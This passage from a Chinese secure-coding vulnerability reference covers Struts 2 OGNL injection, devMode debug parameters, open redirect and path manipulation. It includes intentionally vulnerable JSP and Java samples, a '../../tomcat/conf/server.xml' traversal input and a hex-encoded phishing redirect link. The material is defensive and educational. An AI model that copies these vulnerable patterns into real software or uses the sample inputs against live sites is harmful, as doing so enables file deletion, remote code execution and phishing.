<h5 id="EXPLANATION-302"><a href="#EXPLANATION-302" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果攻击者无法直接控制某个 OGNL 表达式，但可以影响评估结果，则评估该表达式的应用程序不应重新评估第一次评估的输出。否则，攻击者可以控制要在第二次 OGNL 评估中评估的表达式，并注入任意 OGNL 表达式。</p>
<p>示例 1：this.name 表示 Struts 标签名称属性。在下面的示例中，name 属性将在同一方法中被评估两次，第一次评估的输出将被重新评估。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String name = this.findString(this.name, &quot;name&quot;, &quot;Resource bundle name is required. Example: foo or foo_en&quot;);</span><br><span class="line"></span><br><span class="line">ResourceBundle bundle = (ResourceBundle) findValue(&quot;getTexts(&apos;&quot; + name + &quot;&apos;)&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>即使在 JSP 标签中对 name 属性的值进行硬编码，如果攻击者能够控制该属性评估的输出（例如：%{parameters.locale}），则他们仍将能够控制传递到第二次评估的表达式，进而评估任意 OGNL 表达式。</p>
<h5 id="RECOMMENDATIONS-301"><a href="#RECOMMENDATIONS-301" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>避免双重 OGNL 评估问题的最佳方法是禁止 OGNL 表达式评估构成链。如果上述方法不可行，应执行输入验证以防止评估恶意表达式。</p>
<h5 id="REFERENCES-300"><a href="#REFERENCES-300" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Struts 2 - Security Bulletin S2-029 Apache Struts</p>
<p>[2] Struts 2 - Security Bulletin S2-036 Apache Struts</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 94, CWE ID 95</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[18] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 094</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="OGNL-Expression-Injection-Dynamic-Method-Invocation"><a href="#OGNL-Expression-Injection-Dynamic-Method-Invocation" class="headerlink" title="OGNL Expression Injection: Dynamic Method Invocation"></a>OGNL Expression Injection: Dynamic Method Invocation</h4><h5 id="ABSTRACT-302"><a href="#ABSTRACT-302" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Struts 2 应用程序在部分 Struts 2 版本中启用已知易受 OGNL 注入攻击的“动态方法调用”。</p>
<h5 id="EXPLANATION-303"><a href="#EXPLANATION-303" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Struts 2 引入了一种称为“动态方法调用”的功能，该功能允许 Action 暴露方法而非 execute()。!（感叹号）字符或 method: 前缀可用于 Action URL，在启用“动态方法调用”的情况下，可调用 Action 中的任何公共方法。在 Struts 2 版本 2.3.20 中，调用先前基于反射的备选方法的机制替换为使用 OGNL，使得攻击者能够提供恶意 OGNL 表达式，而非备选方法名称。</p>
<h5 id="RECOMMENDATIONS-302"><a href="#RECOMMENDATIONS-302" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>Struts 2.3.1.1 之后，引入了一种新的配置属性禁用“动态方法调用”功能。为了禁用此功能，请使用 struts.enable.DynamicMethodInvocation 属性作为 Struts 2 属性设置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;false&quot; /&gt;</span><br></pre></td></tr></table></figure>
<p>或在 struts.properties 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struts.enable.DynamicMethodInvocation = false</span><br></pre></td></tr></table></figure>
<p>或在 web.xml 的 Struts 2 过滤器中包含此参数节点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line"></span><br><span class="line">  &lt;param-name&gt;struts.enable.DynamicMethodInvocation&lt;/param-name&gt;</span><br><span class="line"></span><br><span class="line">  &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line"></span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-301"><a href="#REFERENCES-301" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Struts 2 Security Vulnerability - Dynamic Method Invocation</p>
<p>[2] Struts 2 - Dynamic Method Invocation Apache Struts</p>
<p>[3] Struts 2 - Security Bulletin S2-032 Apache Struts</p>
<p>[4] Struts 2 - Security Bulletin S2-033 Apache Struts</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 94, CWE ID 95</p>
<p>[6] Standards Mapping - FIPS200 SI</p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1), SI-2 Flaw Remediation (P1)</p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[19] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 094</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="OGNL-Expression-Injection-Struts-2"><a href="#OGNL-Expression-Injection-Struts-2" class="headerlink" title="OGNL Expression Injection: Struts 2"></a>OGNL Expression Injection: Struts 2</h4><h5 id="ABSTRACT-303"><a href="#ABSTRACT-303" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在开发模式 (devMode) 下部署应用程序将允许在服务器上执行任意命令，并将泄露应用程序如何编码的详细信息。</p>
<h5 id="EXPLANATION-304"><a href="#EXPLANATION-304" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Struts 2 中带有名称为 devMode（开发模式）的设置。启用此设置时，Struts 2 将提供额外的日志记录和调试信息，这些信息可以显著加速开发，但可能对性能和安全性造成巨大的影响。devMode 将提高调试级别，或对普通模式中通常不会抛出的、可忽略的问题报告异常。</p>
<p>devMode 也能够启用一些调试功能，以允许开发人员检查存储在值堆栈中的变量。这些功能可以使用 debug 的请求参数来触发：</p>
<ul>
<li><p>debug=console 将弹出 OGNL 评估控制台，允许开发人员在服务器上评估任意 OGNL 表达式。</p>
</li>
<li><p>debug=command 将允许开发人员通过使用请求参数 expression 提交要评估的任意 OGNL 表达式。</p>
</li>
<li><p>debug=xml 可以将参数、上下文、会话和值堆栈转储为 XML 文档。</p>
</li>
<li><p>debug=browser 可以将参数、上下文、会话和值堆栈转储在可浏览的 HTML 文档中。</p>
</li>
</ul>
<h5 id="RECOMMENDATIONS-303"><a href="#RECOMMENDATIONS-303" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>devMode 默认为禁用，并且绝不能在生产环境中启用，因为该模式允许攻击者收集有关应用程序的太多信息以及在服务器上执行任意命令。要确保未启用 devMode，验证常量 struts.devMode 没有在以下任何配置文件中设置为 true：</p>
<p>在 struts.xml 配置文件或包含的文档中：</p>
<p>   <code>&lt;constant name=&quot;struts.devMode&quot; value=&quot;true&quot; /&gt;</code></p>
<p>在 struts.properties 中：</p>
<pre><code>`struts.devMode = true`
</code></pre><p>在 web.xml 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-class&gt;org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt;</span><br><span class="line"></span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line"></span><br><span class="line">        &lt;param-name&gt;struts.devMode&lt;/param-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;param-value&gt;true&lt;/param-value&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line"></span><br><span class="line">&lt;/filter&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-302"><a href="#REFERENCES-302" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Struts 2 Documentation - devMode</p>
<p>[2] Apache Struts 2 Documentation - Debugging</p>
<p>[3] Meder Kydyraliev Milking a horse or executing remote code in modern Java frameworks</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 94, CWE ID 95</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[18] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 094</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Open-Redirect"><a href="#Open-Redirect" class="headerlink" title="Open Redirect"></a>Open Redirect</h4><h5 id="ABSTRACT-304"><a href="#ABSTRACT-304" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果允许未验证的输入控制重定向机制所使用的 URL，可能会有利于攻击者发动钓鱼攻击。</p>
<h5 id="EXPLANATION-305"><a href="#EXPLANATION-305" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>通过重定向，Web 应用程序能够引导用户访问同一应用程序内的不同网页或访问外部站点。应用程序利用重定向来帮助进行站点导航，有时还跟踪用户退出站点的方式。当 Web 应用程序将客户端重定向到攻击者可以控制的任意 URL 时，就会发生 Open redirect 漏洞：</p>
<p>攻击者可以利用 Open redirect 漏洞诱骗用户访问某个可信赖站点的 URL，并将他们重定向到恶意站点。攻击者通过对 URL 进行编码，使最终用户很难注意到重定向的恶意目标，即使将这一目标作为 URL 参数传递给可信赖的站点时也会发生这种情况。因此，Open redirect 常被作为钓鱼手段的一种而滥用，攻击者通过这种方式来获取最终用户的敏感数据。</p>
<p>例 1：以下 JSP 代码会在用户打开链接时，指示用户浏览器打开从 dest 请求参数中解析的 URL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    String strDest = request.getParameter(&quot;dest&quot;);</span><br><span class="line"></span><br><span class="line">    pageContext.forward(strDest);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>如果受害者收到一封电子邮件，指示该用户打开 “<a href="http://trusted.example.com/ecommerce/redirect.asp?dest=www.wilyhacker.com”" target="_blank" rel="noopener">http://trusted.example.com/ecommerce/redirect.asp?dest=www.wilyhacker.com”</a> 链接，用户有可能会打开该链接，因为他会认为这个链接将转到可信赖的站点。然而，一旦用户打开该链接，上面的代码会将浏览器重定向至 “<a href="http://www.wilyhacker.com“。" target="_blank" rel="noopener">http://www.wilyhacker.com“。</a></p>
<p>很多用户都被告知，要始终监视通过电子邮件收到的 URL，以确保链接指向一个他们所熟知的可信赖站点。尽管如此，如果攻击者对目标 URL 进行 16 进制编码： “<a href="http://trusted.example.com/ecommerce/redirect.asp?dest=%77%69%6C%79%68%61%63%6B%65%72%2E%63%6F%6D”" target="_blank" rel="noopener">http://trusted.example.com/ecommerce/redirect.asp?dest=%77%69%6C%79%68%61%63%6B%65%72%2E%63%6F%6D”</a></p>
<p>那么，即使再聪明的最终用户也可能会被欺骗，打开该链接。</p>
<h5 id="RECOMMENDATIONS-304"><a href="#RECOMMENDATIONS-304" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不应当允许未验证的用户输入控制重定向机制中的目标 URL。而应采用间接方法：创建一份合法 URL 列表，用户可以指定其中的内容并且只能从中进行选择。利用这种方法，就绝不会直接使用用户提供的输入来指定要重定向到的 URL。</p>
<p>例 2：以下代码引用了一个通过有效 URL 传播的数组。用户单击的链接将通过与所需 URL 对应的数组索引来传递。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">        int strDest = Integer.parseInt(request.getParameter(&quot;dest&quot;));</span><br><span class="line"></span><br><span class="line">        if((strDest &gt;= 0) &amp;&amp; (strDest &lt;= strURLArray.length -1 ))</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            strFinalURL = strURLArray[strDest];</span><br><span class="line"></span><br><span class="line">            pageContext.forward(strFinalURL);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    catch (NumberFormatException nfe) &#123;</span><br><span class="line"></span><br><span class="line">        // Handle exception</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>但在某些情况下，这种方法并不可行，因为这样一份合法 URL 列表过于庞大、难以跟踪。这种情况下，有一种类似的方法也能限制用于重定向用户的域，这种方法至少可以防止攻击者向用户发送恶意的外部站点。</p>
<h5 id="REFERENCES-303"><a href="#REFERENCES-303" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 601</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A10 Unvalidated Redirects and Forwards</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A10 Unvalidated Redirects and Forwards</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[15] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 601</p>
<p>[16] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 601</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Web Application Security Consortium 24 + 2 Content Spoofing</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 URL Redirector Abuse (WASC-38)</p>
<h4 id="Path-Manipulation"><a href="#Path-Manipulation" class="headerlink" title="Path Manipulation"></a>Path Manipulation</h4><h5 id="ABSTRACT-305"><a href="#ABSTRACT-305" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>允许用户输入控制文件系统操作所用的路径会导致攻击者能够访问或修改其他受保护的系统资源。</p>
<h5 id="EXPLANATION-306"><a href="#EXPLANATION-306" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当满足以下两个条件时，就会产生 path manipulation 错误：</p>
<ol>
<li><p>攻击者可以指定某一文件系统操作中所使用的路径。</p>
</li>
<li><p>攻击者可以通过指定特定资源来获取某种权限，而这种权限在一般情况下是不可能获得的。</p>
</li>
</ol>
<p>例如，在某一程序中，攻击者可以获得特定的权限，以重写指定的文件或是在其控制的配置环境下运行程序。</p>
<p>示例 1：以下代码使用来自于 HTTP 请求的输入来创建一个文件名。程序员没有考虑到攻击者可能使用像“../../tomcat/conf/server.xml”一样的文件名，从而导致应用程序删除它自己的配置文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String rName = request.getParameter(&quot;reportName&quot;);</span><br><span class="line"></span><br><span class="line">File rFile = new File(&quot;/usr/local/apfr/reports/&quot; + rName);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">rFile.delete();</span><br></pre></td></tr></table></figure>
<p>例 2： 下面的代码使用来自于配置文件的输入来决定打开哪个文件，并返回给用户。如果程序在一定的权限下运行，且恶意用户能够篡改配置文件，那么他们可以通过程序读取系统中以 .txt 扩展名结尾的所有文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fis = new FileInputStream(cfg.getProperty(&quot;sub&quot;)+&quot;.txt&quot;);</span><br><span class="line"></span><br><span class="line">amt = fis.read(arr);</span><br><span class="line"></span><br><span class="line">out.println(arr);</span><br></pre></td></tr></table></figure>
<p>有些人认为在移动世界中，典型的漏洞（如 path manipulation）是无意义的 – 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。</p>
<p>例 3：以下代码将例 1 改编为适用于 Android 平台。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        String rName = this.getIntent().getExtras().getString(&quot;reportName&quot;);</span><br><span class="line"></span><br><span class="line">	File rFile = getBaseContext().getFileStreamPath(rName);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	rFile.delete();</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-305"><a href="#RECOMMENDATIONS-305" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>防止 path manipulation 的最佳方法是采用一些间接手段：例如创建一份合法资源名的列表，并且规定用户只能选择其中的文件名。通过这种方法，用户就不能直接由自己来指定资源的名称了。</p>
<p>但在某些情况下，这种方法并不可行，因为这样一份合法资源名的列表过于庞大、难以跟踪。因此，程序员通常在这种情况下采用黑名单的办法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何这样一份黑名单都不可能是完整的，而且将随着时间的推移而过时。更好的方法是创建一份白名单，允许其中的字符出现在资源名称中，且只接受完全由这些被认可的字符组成的输入。</p>
<h5 id="REFERENCES-304"><a href="#REFERENCES-304" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[2] FIO00-J. Do not operate on files in shared directories CERT</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 22, CWE ID 73</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[7] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs</p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
